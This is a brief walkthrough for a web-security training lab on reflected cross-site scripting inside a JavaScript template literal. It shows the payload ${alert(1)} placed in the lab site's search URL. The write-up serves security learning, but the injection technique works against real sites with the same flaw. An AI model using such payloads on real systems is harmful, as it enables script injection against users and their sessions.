# Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

## This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the `alert` function inside the template string.

### HINT: `${alert(1)}`

---

### step 1

search test into search bar
url will be
`https://0a380086040a8bc0815c3e5900720072.web-security-academy.net/?search=test`
change test with ${alert(1)}
`https://0a380086040a8bc0815c3e5900720072.web-security-academy.net/?search=${alert(1)}`
